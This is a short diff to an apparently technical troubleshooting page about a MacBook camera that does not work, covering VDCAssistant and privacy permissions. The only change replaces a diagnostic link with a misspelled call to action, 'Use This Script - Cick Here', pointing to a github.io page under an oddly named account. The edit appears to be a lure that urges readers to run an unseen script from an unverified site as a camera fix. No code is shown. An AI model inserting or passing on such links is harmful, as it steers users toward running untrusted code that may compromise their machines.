@@ -6,7 +6,7 @@
 
 ## MacBook Camera Not Working — VDCAssistant Architecture, ISP Driver Layer, and Privacy Permission Failures
 
-> **[Probe your Mac's VDCAssistant and camera privacy state](https://error-number-472173.github.io/.github/mac-camera-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-camera-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Camera Not Working, in order of architectural impact:**
 
